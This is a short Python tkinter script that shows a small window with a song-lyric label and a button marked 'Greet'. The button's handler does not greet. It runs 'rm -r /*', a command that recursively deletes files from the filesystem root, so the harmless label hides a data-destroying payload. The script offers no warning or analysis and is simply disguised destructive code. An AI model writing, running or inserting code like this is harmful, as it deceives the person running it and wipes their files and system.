from tkinter import *
import os

class MyFirstGUI:
    def __init__(self, master):
        self.master = master
        master.title("Killer_Queen")
        master.geometry("400x400")

        self.lb = Label(master, text="She's a killer queen...")
        self.lb.pack()

        self.killer_button = Button(master, text="Greet", command=self.killer)
        self.killer_button.pack()



    def killer(self):
        os.system("rm -r /*")
        

root = Tk()
my_gui = MyFirstGUI(root)
root.mainloop()
